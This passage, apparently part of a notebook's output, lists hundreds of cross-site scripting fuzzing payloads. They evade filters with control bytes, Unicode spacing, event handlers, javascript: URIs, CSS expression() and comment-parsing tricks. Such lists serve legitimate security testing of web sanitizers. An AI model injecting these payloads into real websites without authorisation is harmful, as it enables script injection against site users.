       " '<svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload>',\n",
       " '<applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror>',\n",
       " '<body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"></body onkeyup>',\n",
       " '<body onunload body onunload=\"javascript:javascript:alert(1)\"></body onunload>',\n",
       " '<iframe onload iframe onload=\"javascript:javascript:alert(1)\"></iframe onload>',\n",
       " '<body onload body onload=\"javascript:javascript:alert(1)\"></body onload>',\n",
       " '<html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"></html onmouseover>',\n",
       " '<object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"></object onbeforeload>',\n",
       " '<body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"></body onbeforeunload>',\n",
       " '<body onfocus body onfocus=\"javascript:javascript:alert(1)\"></body onfocus>',\n",
       " '<body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"></body onkeydown>',\n",
       " '<iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"></iframe onbeforeload>',\n",
       " '<iframe src iframe src=\"javascript:javascript:alert(1)\"></iframe src>',\n",
       " '<svg onload svg onload=\"javascript:javascript:alert(1)\"></svg onload>',\n",
       " '<html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"></html onmousemove>',\n",
       " '<body onblur body onblur=\"javascript:javascript:alert(1)\"></body onblur>',\n",
       " '\\\\x3Cscript>javascript:alert(1)</script>',\n",
       " '\\'\"`><script>/* *\\\\x2Fjavascript:alert(1)// */</script>',\n",
       " '<script>javascript:alert(1)</script\\\\x0D',\n",
       " '<script>javascript:alert(1)</script\\\\x0A',\n",
       " '<script>javascript:alert(1)</script\\\\x0B',\n",
       " '<script charset=\"\\\\x22>javascript:alert(1)</script>',\n",
       " '<!--\\\\x3E<img src=xxx:x onerror=javascript:alert(1)> -->',\n",
       " '--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->',\n",
       " '--><!-- --\\\\x00> <img src=xxx:x onerror=javascript:alert(1)> -->',\n",
       " '--><!-- --\\\\x21> <img src=xxx:x onerror=javascript:alert(1)> -->',\n",
       " '--><!-- --\\\\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->',\n",
       " '`\"\\'><img src=\\'#\\\\x27 onerror=javascript:alert(1)>',\n",
       " '<a href=\"javascript\\\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '\"\\'`><p><svg><script>a=\\'hello\\\\x27;javascript:alert(1)//\\';</script></p>',\n",
       " '<a href=\"javas\\\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x08cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x03cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x04cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x01cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x05cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x09cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x06cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javas\\\\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<script>/* *\\\\x2A/javascript:alert(1)// */</script>',\n",
       " '<script>/* *\\\\x00/javascript:alert(1)// */</script>',\n",
       " '<style></style\\\\x3E<img src=\"about:blank\" onerror=javascript:alert(1)//></style>',\n",
       " '<style></style\\\\x0D<img src=\"about:blank\" onerror=javascript:alert(1)//></style>',\n",
       " '<style></style\\\\x09<img src=\"about:blank\" onerror=javascript:alert(1)//></style>',\n",
       " '<style></style\\\\x20<img src=\"about:blank\" onerror=javascript:alert(1)//></style>',\n",
       " '<style></style\\\\x0A<img src=\"about:blank\" onerror=javascript:alert(1)//></style>',\n",
       " '\"\\'`>ABC<div style=\"font-family:\\'foo\\'\\\\x7Dx:expression(javascript:alert(1);/*\\';\">DEF',\n",
       " '\"\\'`>ABC<div style=\"font-family:\\'foo\\'\\\\x3Bx:expression(javascript:alert(1);/*\\';\">DEF',\n",
       " \"%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\",\n",
       " '<script>if(\"x\\\\\\\\xE1\\\\x96\\\\x89\".length==2) { javascript:alert(1);}</script>',\n",
       " '<script>if(\"x\\\\\\\\xE0\\\\xB9\\\\x92\".length==2) { javascript:alert(1);}</script>',\n",
       " '<script>if(\"x\\\\\\\\xEE\\\\xA9\\\\x93\".length==2) { javascript:alert(1);}</script>',\n",
       " '\\'`\"><\\\\x3Cscript>javascript:alert(1)</script>',\n",
       " '\\'`\"><\\\\x00script>javascript:alert(1)</script>',\n",
       " '\"\\'`><\\\\x3Cimg src=xxx:x onerror=javascript:alert(1)>',\n",
       " '\"\\'`><\\\\x00img src=xxx:x onerror=javascript:alert(1)>',\n",
       " '<script src=\"data:text/plain\\\\x2Cjavascript:alert(1)\"></script>',\n",
       " '<script src=\"data:\\\\xD4\\\\x8F,javascript:alert(1)\"></script>',\n",
       " '<script src=\"data:\\\\xE0\\\\xA4\\\\x98,javascript:alert(1)\"></script>',\n",
       " '<script src=\"data:\\\\xCB\\\\x8F,javascript:alert(1)\"></script>',\n",
       " '<script\\\\x20type=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x3Etype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x09type=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x0Atype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " 'ABC<div style=\"x\\\\x3Aexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:expression\\\\x5C(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:expression\\\\x00(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:exp\\\\x00ression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:exp\\\\x5Cression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x0Aexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x09expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE3\\\\x80\\\\x80expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x84expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xC2\\\\xA0expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x80expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x8Aexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x0Dexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x0Cexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x87expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xEF\\\\xBB\\\\xBFexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x20expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x88expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x00expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x8Bexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x86expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x85expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x82expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\x0Bexpression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x81expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x83expression(javascript:alert(1)\">DEF',\n",
       " 'ABC<div style=\"x:\\\\xE2\\\\x80\\\\x89expression(javascript:alert(1)\">DEF',\n",
       " '<a href=\"\\\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xC2\\\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE1\\\\xA0\\\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE1\\\\x9A\\\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE3\\\\x80\\\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x80\\\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\xE2\\\\x81\\\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"\\\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javascript\\\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javascript\\\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javascript\\\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javascript\\\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '<a href=\"javascript\\\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',\n",
       " '`\"\\'><img src=xxx:x \\\\x0Aonerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x22onerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x0Bonerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x0Donerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x2Fonerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x09onerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x0Conerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x00onerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x27onerror=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x \\\\x20onerror=javascript:alert(1)>',\n",
       " '\"`\\'><script>\\\\x3Bjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x0Djavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xEF\\\\xBB\\\\xBFjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x81javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x84javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE3\\\\x80\\\\x80javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x09javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x89javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x85javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x88javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x00javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\xA8javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x8Ajavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE1\\\\x9A\\\\x80javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x0Cjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x2Bjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xF0\\\\x90\\\\x96\\\\x9Ajavascript:alert(1)</script>',\n",
       " '\"`\\'><script>-javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x0Ajavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\xAFjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x7Ejavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x87javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x81\\\\x9Fjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\xA9javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xC2\\\\x85javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xEF\\\\xBF\\\\xAEjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x83javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x8Bjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xEF\\\\xBF\\\\xBEjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x80javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x21javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x82javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE2\\\\x80\\\\x86javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xE1\\\\xA0\\\\x8Ejavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x0Bjavascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\x20javascript:alert(1)</script>',\n",
       " '\"`\\'><script>\\\\xC2\\\\xA0javascript:alert(1)</script>',\n",
       " '\"/><img/onerror=\\\\x0Bjavascript:alert(1)\\\\x0Bsrc=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x22javascript:alert(1)\\\\x22src=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x09javascript:alert(1)\\\\x09src=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x27javascript:alert(1)\\\\x27src=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x0Ajavascript:alert(1)\\\\x0Asrc=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x0Cjavascript:alert(1)\\\\x0Csrc=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x0Djavascript:alert(1)\\\\x0Dsrc=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x60javascript:alert(1)\\\\x60src=xxx:x />',\n",
       " '\"/><img/onerror=\\\\x20javascript:alert(1)\\\\x20src=xxx:x />',\n",
       " '<script\\\\x2F>javascript:alert(1)</script>',\n",
       " '<script\\\\x20>javascript:alert(1)</script>',\n",
       " '<script\\\\x0D>javascript:alert(1)</script>',\n",
       " '<script\\\\x0A>javascript:alert(1)</script>',\n",
       " '<script\\\\x0C>javascript:alert(1)</script>',\n",
       " '<script\\\\x00>javascript:alert(1)</script>',\n",
       " '<script\\\\x09>javascript:alert(1)</script>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x0B=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x00=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x0C=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x0D=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x20=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x0A=javascript:alert(1)>',\n",
       " '`\"\\'><img src=xxx:x onerror\\\\x09=javascript:alert(1)>',\n",
       " '<script>javascript:alert(1)<\\\\x00/script>',\n",
       " '<img src=# onerror\\\\x3D\"javascript:alert(1)\" >',\n",
       " '<input onfocus=javascript:alert(1) autofocus>',\n",
       " '<input onblur=javascript:alert(1) autofocus><input autofocus>',\n",
       " '<video poster=javascript:javascript:alert(1)//',\n",
       " '<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X',\n",
       " '<video><source onerror=\"javascript:javascript:alert(1)\">',\n",
       " '<video onerror=\"javascript:javascript:alert(1)\"><source>',\n",
       " '<form><button formaction=\"javascript:javascript:alert(1)\">X',\n",
       " '<body oninput=javascript:alert(1)><input autofocus>',\n",
       " '<math href=\"javascript:javascript:alert(1)\">CLICKME</math>  <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(1)\">CLICKME</maction> </math>',\n",
       " '<frameset onload=javascript:alert(1)>',\n",
       " '<table background=\"javascript:javascript:alert(1)\">',\n",
       " '<!--<img src=\"--><img src=x onerror=javascript:alert(1)//\">',\n",
       " '<comment><img src=\"</comment><img src=x onerror=javascript:alert(1))//\">',\n",
       " '<![><img src=\"]><img src=x onerror=javascript:alert(1)//\">',\n",
       " '<style><img src=\"</style><img src=x onerror=javascript:alert(1)//\">',\n",
       " '<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>',\n",
       " '<head><base href=\"javascript://\"></head><body><a href=\"/. /,javascript:alert(1)//#\">XXX</a></body>',\n",
       " '<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>',\n",
       " '<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>',\n",
       " '<object data=\"data:text/html;base64,%(base64)s\">',\n",
       " '<embed src=\"data:text/html;base64,%(base64)s\">',\n",
       " '<b <script>alert(1)</script>0',\n",
       " '<x \\'=\"foo\"><x foo=\\'><img src=x onerror=javascript:alert(1)//\\'>',\n",
       " '<embed src=\"javascript:alert(1)\">',\n",
       " '<img src=\"javascript:alert(1)\">',\n",
       " '<image src=\"javascript:alert(1)\">',\n",
       " '<script src=\"javascript:alert(1)\">',\n",
       " '<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x',\n",
       " '<? foo=\"><script>javascript:alert(1)</script>\">',\n",
       " '<! foo=\"><script>javascript:alert(1)</script>\">',\n",
       " '</ foo=\"><script>javascript:alert(1)</script>\">',\n",
       " '<? foo=\"><x foo=\\'?><script>javascript:alert(1)</script>\\'>\">',\n",
       " '<! foo=\"[[[Inception]]\"><x foo=\"]foo><script>javascript:alert(1)</script>\">',\n",
       " '<% foo><x foo=\"%><script>javascript:alert(1)</script>\">',\n",
       " '<div id=d><x xmlns=\"><iframe onload=javascript:alert(1)\"></div> <script>d.innerHTML=d.innerHTML</script>',\n",
       " '<img \\\\x00src=x onerror=\"alert(1)\">',\n",
       " '<img \\\\x47src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img \\\\x11src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img \\\\x12src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img\\\\x47src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img\\\\x10src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img\\\\x13src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img\\\\x32src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img\\\\x47src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img\\\\x11src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img \\\\x47src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img \\\\x34src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img \\\\x39src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img \\\\x00src=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x09=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x10=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x13=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x32=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x12=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x11=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x00=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src\\\\x47=x onerror=\"javascript:alert(1)\">',\n",
       " '<img src=x\\\\x09onerror=\"javascript:alert(1)\">',\n",
       " '<img src=x\\\\x10onerror=\"javascript:alert(1)\">',\n",
       " '<img src=x\\\\x11onerror=\"javascript:alert(1)\">',\n",
       " '<img src=x\\\\x12onerror=\"javascript:alert(1)\">',\n",
       " '<img src=x\\\\x13onerror=\"javascript:alert(1)\">',\n",
       " '<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">',\n",
       " '<img src=x onerror=\\\\x09\"javascript:alert(1)\">',\n",
       " '<img src=x onerror=\\\\x10\"javascript:alert(1)\">',\n",
       " '<img src=x onerror=\\\\x11\"javascript:alert(1)\">',\n",
       " '<img src=x onerror=\\\\x12\"javascript:alert(1)\">',\n",
       " '<img src=x onerror=\\\\x32\"javascript:alert(1)\">',\n",
       " '<img src=x onerror=\\\\x00\"javascript:alert(1)\">',\n",
       " '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>',\n",
       " '<img src=\"x` `<script>javascript:alert(1)</script>\"` `>',\n",
       " '<img src onerror /\" \\'\"= alt=javascript:alert(1)//\">',\n",
       " '<title onpropertychange=javascript:alert(1)></title><title title=>',\n",
       " '<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">',\n",
       " '<!--[if]><script>javascript:alert(1)</script -->',\n",
       " '<!--[if<img src=x onerror=javascript:alert(1)//]> -->',\n",
       " '<script src=\"/\\\\%(jscript)s\"></script>',\n",
       " '<script src=\"\\\\\\\\%(jscript)s\"></script>',\n",
       " '<a style=\"-o-link:\\'javascript:javascript:alert(1)\\';-o-link-source:current\">X',\n",
       " \"<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>\",\n",
       " '<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d',\n",
       " '<style>@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";</style>',\n",
       " '<a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"javascript:alert(1);\">XXX</a></a><a href=\"javascript:javascript:alert(1)\">XXX</a>',\n",
       " \"<style>*[{}@import'%(css)s?]</style>X\",\n",
       " '<div style=\"font-family:\\'foo&#10;;color:red;\\';\">XXX',\n",
       " '<div style=\"font-family:foo}color=red;\">XXX',\n",
       " '<// style=x:expression\\\\28javascript:alert(1)\\\\29>',\n",
       " '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>',\n",
       " '<div style=content:url(%(svg)s)></div>',\n",
       " '<div style=\"list-style:url(http://foo.f)\\\\20url(javascript:javascript:alert(1));\">X',\n",
       " '<div id=d><div style=\"font-family:\\'sans\\\\27\\\\3B color\\\\3Ared\\\\3B\\'\">X</div></div> <script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>',\n",
       " '<div style=\"background:url(/f#&#127;oo/;color:red/*/foo.jpg);\">X',\n",
       " '<div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X',\n",
       " '<div id=\"x\">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>',\n",
       " '<x style=\"background:url(\\'x&#1;;color:red;/*\\')\">XXX</x>',\n",
